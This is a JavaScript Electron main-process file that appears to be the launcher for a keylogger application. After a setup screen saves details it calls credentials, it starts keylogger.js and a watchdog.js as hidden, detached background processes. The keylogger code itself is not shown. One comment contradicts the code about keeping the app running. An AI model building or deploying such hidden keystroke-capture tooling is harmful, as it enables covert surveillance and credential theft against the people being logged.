// Importing required modules from Electron, path, fs, and child_process
const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');

// Declare variables for the main window and keylogger process status
let mainWindow;
let keyloggerRunning = false; // Flag to track if the keylogger is running
// Path to the keywords file
const keywordsFilePath = path.join(__dirname, 'keywords.txt');

if (!fs.existsSync(keywordsFilePath)) {
  fs.writeFileSync(keywordsFilePath, '');  // Create an empty file if it doesn't exist
}

console.log('Keywords file path:', keywordsFilePath);

// Function to create the main application window
function createWindow() {
  console.log('Creating main window');

  // Initialize the main window with specific configurations
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'), // Preload script to handle communication between renderer and main processes
      contextIsolation: true, // Enable context isolation
      nodeIntegration: false, // Allow node integration
    },
  });

  // Define the path to the setup details file, which stores the credentials:
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');

  // Check if the setup details already exist to determine which screen to load
  if (fs.existsSync(setupDetailsPath)) {
    console.log('Setup details found, loading monitoring.html');
    mainWindow.loadFile('monitoring.html'); // Load the monitoring screen to the main window
    startKeylogger(); // Start the keylogger if setup details exist
  } else {
    console.log('No setup details found, loading index.html');
    mainWindow.loadFile('index.html'); // Load the setup screen if no details are found
  }

  // Event handler for when the main window is closed
  mainWindow.on('closed', function () {
    mainWindow = null; // Dereference the window object
  });
}


// IPC listener for saving setup details sent from the renderer process
ipcMain.on('save-setup-details', (event, details) => {
  // Define the path to save the setup details
  const setupDetailsPath = path.join(app.getPath('userData'), 'setup-details.json');
  // Save the setup details as a JSON file
  fs.writeFileSync(setupDetailsPath, JSON.stringify(details));

  console.log('Setup details saved');
  console.log('Closing main window');

  // Close the main window after saving details
  if (mainWindow) {
    mainWindow.close();
  }

  // Start the keylogger process after saving details
  startKeylogger();
});


// Function to start the keylogger process
function startKeylogger() {
  if (!keyloggerRunning) {
    console.log('Starting keylogger...');
    const keyloggerPath = path.join(__dirname, 'keylogger.js');
    const watchdogPath = path.join(__dirname, 'watchdog.js');

    // Command to start the keylogger script directly without a visible window
    const keyloggerCommand = `start "" /b node "${keyloggerPath}"`;

    // Command to start the watchdog script
    const watchdogCommand = `start "" /b node "${watchdogPath}"`;

    console.log(`Executing command: ${keyloggerCommand}`);
    console.log(`Executing watchdog command: ${watchdogCommand}`);

    // Use 'exec' to start the keylogger
    const keyloggerProcess = exec(keyloggerCommand);

    // Handle potential error events when attempting to start the keylogger
    keyloggerProcess.on('error', (error) => {
      console.error(`Failed to start keylogger process: ${error.message}`);
      keyloggerRunning = false;
    });

    // Handle the 'spawn' event indicating successful startup of the keylogger
    keyloggerProcess.on('spawn', () => {
      console.log('Keylogger started');
      keyloggerRunning = true;
    });

    // Use 'exec' to start the watchdog
    const watchdogProcess = exec(watchdogCommand);

    // Handle potential error events when attempting to start the watchdog
    watchdogProcess.on('error', (error) => {
      console.error(`Failed to start watchdog process: ${error.message}`);
    });

    // Handle the 'spawn' event indicating successful startup of the watchdog
    watchdogProcess.on('spawn', () => {
      console.log('Watchdog started');
    });

    // Optionally, detach the processes if needed
    keyloggerProcess.unref();
    watchdogProcess.unref();
  } else {
    console.log('Keylogger is already running');
  }
}


// Event handler when Electron app is ready to create the window
app.on('ready', createWindow);

// Event handler when all windows are closed
app.on('window-all-closed', function () {
  // On non-Mac systems, don't quit the app if windows are closed to keep keylogger running
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// Event handler to recreate the window when the app is activated
app.on('activate', function () {
  if (mainWindow === null) {
    createWindow(); // Recreate the window if it was previously closed
  }
});
